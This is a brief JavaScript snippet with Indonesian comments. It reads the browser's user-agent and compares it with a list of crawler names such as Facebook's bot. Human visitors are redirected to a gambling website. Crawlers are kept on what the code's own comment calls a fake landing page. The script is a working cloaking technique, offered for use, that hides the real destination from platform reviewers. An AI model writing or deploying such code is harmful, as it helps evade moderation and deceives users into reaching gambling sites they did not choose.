const botList = [
  "facebook", "facebot", "twitterbot", "crawler", "bot", "preview", "slurp"
];

const userAgent = navigator.userAgent.toLowerCase();
const isBot = botList.some(bot => userAgent.includes(bot));

if (!isBot) {
  // Redirect ke situs judi jika bukan bot
  window.location.href = "https://situsjudi-anda.com";
} else {
  // Tetap tampilkan landing page palsu untuk bot Facebook
  console.log("Bot detected. No redirect.");
}
